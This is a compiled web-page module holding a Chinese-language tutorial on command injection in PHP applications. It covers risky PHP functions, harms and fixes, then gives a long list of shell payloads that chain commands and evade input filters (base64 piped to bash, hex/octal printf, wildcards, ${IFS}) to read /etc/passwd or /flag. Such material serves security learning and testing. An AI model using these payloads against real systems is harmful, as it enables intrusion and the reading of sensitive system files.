import{_ as a,p as s,q as n,Z as t}from"./framework-47a2e622.js";const e={},p=t(`<h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>最早称为命令注入攻击（Command Injection），是指由于 web 应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至 Web 应用程序中，并利用该方式执行外部程序或系统命令实施攻击非法获取数据或网络资源等。</p><h3 id="php命令执行函数" tabindex="-1"><a class="header-anchor" href="#php命令执行函数" aria-hidden="true">#</a> PHP命令执行函数</h3><ul><li><code>system</code> =&gt; 用来执行一个外部的应用程序并将相应的执行结果输出。</li><li><code>passthru</code> =&gt; 函数可以用来执行一个 UNIX 系统命令并显示原始的输出。</li><li><code>exec</code> =&gt; 用来执行一个外部的应用程序。</li><li><code>eval</code> =&gt; 函数会将参数字符串作为 <strong>PHP 程序代码来执行</strong>，将 php 代码保存成字符串的形式，然后传递给 eval 函数执行。</li></ul><h3 id="php代码执行函数" tabindex="-1"><a class="header-anchor" href="#php代码执行函数" aria-hidden="true">#</a> PHP代码执行函数</h3><table><thead><tr><th style="text-align:left;">函数名</th></tr></thead><tbody><tr><td style="text-align:left;"><code>eval()</code></td></tr><tr><td style="text-align:left;"><code>assert()</code></td></tr><tr><td style="text-align:left;"><code>preg_replace()</code></td></tr><tr><td style="text-align:left;"><code>create_function()</code></td></tr><tr><td style="text-align:left;"><code>call_user_func()</code></td></tr><tr><td style="text-align:left;"><code>call_user_func_array()</code></td></tr></tbody></table><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>执行恶意命令，危害服务器。</li><li>可能使服务器被恶意攻击者控制。</li></ul><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><ul><li>严格过滤用户输入的数据，禁止执行系统命令。</li><li>使用动态函数之前，确保使用的函数是指定函数。</li><li>在执行命令函数，对参数进行过滤，并对敏感字符进行转义。</li><li>使用函数替换命令执行，并且参数值尽量使用引号包括。</li></ul><h2 id="测试方法" tabindex="-1"><a class="header-anchor" href="#测试方法" aria-hidden="true">#</a> 测试方法</h2><p>使用 <code>&amp;</code> <code>&amp;&amp;</code> <code>|</code> <code>||</code></p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">ping</span> www.baidu.com <span class="token operator">&amp;</span> <span class="token function">cat</span> /etc/passwd <span class="token comment"># &amp;：命令后台执行。</span>
<span class="token function">ping</span> www.baidu.com <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /etc/passwd <span class="token comment"># &amp;&amp;：第一条命令执行成功后，才会执行后一条命令。</span>
<span class="token function">ping</span> www.baidu.com <span class="token operator">|</span> <span class="token function">cat</span> /etc/passwd <span class="token comment"># |：第一条命令的输出作为后一条命令的输入。</span>
<span class="token function">ping</span> www.baidu.com <span class="token operator">||</span> <span class="token function">cat</span> /etc/passwd <span class="token comment"># ||：第一条命令执行失败后，才会执行后一条命令。</span>
</code></pre></div><ul><li>使用<code>;</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">ping</span> www.baidu.com<span class="token punctuation">;</span><span class="token function">cat</span> /etc/passwd
</code></pre></div><ul><li>使用<code>{}</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">{</span>cat,/etc/passwd<span class="token punctuation">}</span>
</code></pre></div><ul><li>使用命令拼接</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>/etc<span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span>/passwd<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span><span class="token variable">$d</span><span class="token variable">$e</span>
</code></pre></div><ul><li>使用<code>&lt;&gt;</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>cat<span class="token operator">&lt;&gt;</span>/etc/passwd
</code></pre></div><ul><li>使用<code>\\</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ca<span class="token punctuation">\\</span>t /et<span class="token punctuation">\\</span>c/passwd
</code></pre></div><ul><li>使用特殊变量</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ca<span class="token variable">$@</span>t /et<span class="token variable">$@</span>c/passwd
ca<span class="token variable">$1t</span> /et<span class="token variable">$2c</span>/passwd
</code></pre></div><ul><li>使用模式匹配</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> t<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>st
<span class="token function">cat</span> t<span class="token punctuation">{</span>a,b,c,d,e,f<span class="token punctuation">}</span>st
</code></pre></div><ul><li>使用单双引号</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>c<span class="token string">&quot;&quot;</span>at fl<span class="token string">&#39;&#39;</span>ag.tx<span class="token string">&quot;&quot;</span>t
</code></pre></div><ul><li>使用反引号</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> <span class="token variable"><span class="token variable">\`</span><span class="token function">ls</span><span class="token variable">\`</span></span> <span class="token comment"># 单引号包裹的是命令</span>
</code></pre></div><ul><li>使用编码</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&quot;Y2F0IC9mbGFn&quot;</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /etc/passwd
<span class="token builtin class-name">echo</span> Y2F0IC9mbGFn<span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">sh</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /etc/passwd
</code></pre></div><ul><li>使用 <em>oct</em> 字节</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">&quot;<span class="token entity" title="\\154">\\154</span><span class="token entity" title="\\163">\\163</span>&quot;</span><span class="token variable">)</span></span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token function">ls</span>
<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">&quot;<span class="token entity" title="\\x63">\\x63</span><span class="token entity" title="\\x61">\\x61</span><span class="token entity" title="\\x74">\\x74</span><span class="token entity" title="\\x20">\\x20</span><span class="token entity" title="\\x2f">\\x2f</span><span class="token entity" title="\\x66">\\x66</span><span class="token entity" title="\\x6c">\\x6c</span><span class="token entity" title="\\x61">\\x61</span><span class="token entity" title="\\x67">\\x67</span>&quot;</span><span class="token variable">)</span></span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /flag
<span class="token punctuation">{</span>printf,<span class="token string">&quot;<span class="token entity" title="\\x63">\\x63</span><span class="token entity" title="\\x61">\\x61</span><span class="token entity" title="\\x74">\\x74</span><span class="token entity" title="\\x20">\\x20</span><span class="token entity" title="\\x2f">\\x2f</span><span class="token entity" title="\\x66">\\x66</span><span class="token entity" title="\\x6c">\\x6c</span><span class="token entity" title="\\x61">\\x61</span><span class="token entity" title="\\x67">\\x67</span>&quot;</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">\\</span><span class="token variable">$0</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /flag
</code></pre></div><ul><li>使用通配符<code>? *</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> /flag <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /?lag <span class="token operator">=</span><span class="token operator">&gt;</span> /???/?at /?lag <span class="token operator">=</span><span class="token operator">&gt;</span> /???/?<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>t<span class="token punctuation">]</span> /?<span class="token string">&quot;?&quot;</span>?&quot;?
</code></pre></div><ul><li>使用<code>more</code> <code>less</code></li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">more</span> /etc/passwd
<span class="token function">less</span> /etc/passwd
</code></pre></div><ul><li>空格绕过</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>cat<span class="token operator">&lt;</span>/flag
cat<span class="token operator">&lt;&gt;</span>/flag
<span class="token function">cat</span><span class="token variable">\${<span class="token environment constant">IFS</span>}</span>/flag
<span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span>/flag
</code></pre></div><ul><li>使用 <code>\\</code>，主要绕过命令输入的长度限制</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&quot;cat<span class="token entity" title="\\\\">\\\\</span>&quot;</span> <span class="token operator">&gt;&gt;</span> cmd
<span class="token function">sh</span> cmd
</code></pre></div>`,43),l=[p];function c(o,i){return s(),n("div",null,l)}const d=a(e,[["render",c],["__file","RCE.html.vue"]]);export{d as default};
